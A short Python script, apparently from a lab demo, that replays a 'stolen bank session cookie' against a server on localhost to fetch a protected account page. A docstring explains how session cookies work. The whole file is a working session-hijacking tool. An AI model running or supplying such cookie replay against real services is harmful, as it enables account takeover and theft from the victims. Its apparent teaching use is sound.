"""
this script sends a request to a web server using a provided session ID aka cookie.

cookies are used to remember who a user is after they log in.
instead of logging in normally, this script manually attaches a session_id to a GET request and sends it to the server.

if session_id valid, the server treat the request as coming from an already logged in user and return protected information.
"""

import argparse
import requests


REAL_SERVER = "http://127.0.0.1:5000"




def main():
    parser = argparse.ArgumentParser(
        description="Replay a stolen bank session cookie against the real server."
    )
    parser.add_argument("session_id", help="The stolen session_id value")
    parser.add_argument(
        "--path",
        default="/account",
        help="Protected path to request on the real server (default: /account)",
    )
    args = parser.parse_args()


    cookies = {"session_id": args.session_id}
    url = f"{REAL_SERVER}{args.path}"


    print(f"[+] Replaying stolen cookie against {url}")
    response = requests.get(url, cookies=cookies, timeout=10)


    print(f"[+] HTTP {response.status_code}")
    print("-" * 60)
    print(response.text)
    print("-" * 60)




if __name__ == "__main__":
    main()
